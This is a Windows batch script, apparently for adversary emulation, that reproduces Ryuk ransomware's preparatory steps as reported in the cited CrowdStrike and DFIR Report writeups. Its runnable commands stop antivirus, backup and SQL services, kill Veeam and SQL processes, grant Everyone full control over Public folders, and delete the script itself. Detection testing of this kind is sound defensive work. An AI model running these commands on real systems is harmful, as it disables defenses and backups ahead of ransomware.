:: T1489 - Service Stop
:: T1222.001 - File and Directory Permissions Modification: Windows File and Directory Permissions Modification
:: T1562.001 - Impair Defenses: Disable or Modify Tools

:: From source: https://www.crowdstrike.com/blog/big-game-hunting-with-ryuk-another-lucrative-targeted-ransomware/ 
net stop avpsus /y
net stop McAfeeDLPAgentService /y
net stop mfewc /y
net stop BMRBootService /y
net stop NetBackupBMRMTFTPService /y

sc config SQLTELEMETRY start=disabled
sc config SQLTELEMETRY$ECWDB2 start=disabled
sc config SQLWriter start=disabled
sc config SstpSvc start=disabled
taskkill /IM mspub.exe /F
taskkill /IM mydesktopqos.exe /F
taskkill /IM mydesktopservice.exe /F

:: From https://thedfirreport.com/2020/11/05/ryuk-speed-run-2-hours-to-ransom/ 
net stop samss /y
net stop veeamcatalogsvc /y
net stop veeamcloudsvc /y
net stop veeamdeploysvc /y
net stop samss /y
net stop veeamcatalogsvc /y
net stop veeamcloudsvc /y
net stop veeamdeploysvc /y
taskkill /IM sqlbrowser.exe /F
taskkill /IM sqlceip.exe /F
taskkill /IM sqlservr.exe /F
taskkill /IM sqlwriter.exe /F
taskkill /IM veeam.backup.agent.configurationservice.exe /F
taskkill /IM veeam.backup.brokerservice.exe /F
taskkill /IM veeam.backup.catalogdataservice.exe /F
taskkill /IM veeam.backup.cloudservice.exe /F
taskkill /IM veeam.backup.externalinfrastructure.dbprovider.exe /F
taskkill /IM veeam.backup.manager.exe /F
taskkill /IM veeam.backup.mountservice.exe /F
taskkill /IM veeam.backup.service.exe /F
taskkill /IM veeam.backup.uiserver.exe /F
taskkill /IM veeam.backup.wmiserver.exe /F
taskkill /IM veeamdeploymentsvc.exe /F
taskkill /IM veeamfilesysvsssvc.exe /F
taskkill /IM veeam.guest.interaction.proxy.exe /F
taskkill /IM veeamnfssvc.exe /F
taskkill /IM veeamtransportsvc.exe /F
:: taskmgr /4
:: wmiprvse -Embedding
:: wmiprvse -secured -Embedding
icacls "C:\Users\Public\*" /grant Everyone:F /T /C /Q
icacls "Z:\Users\Public\*" /grant Everyone:F /T /C /Q
del %0
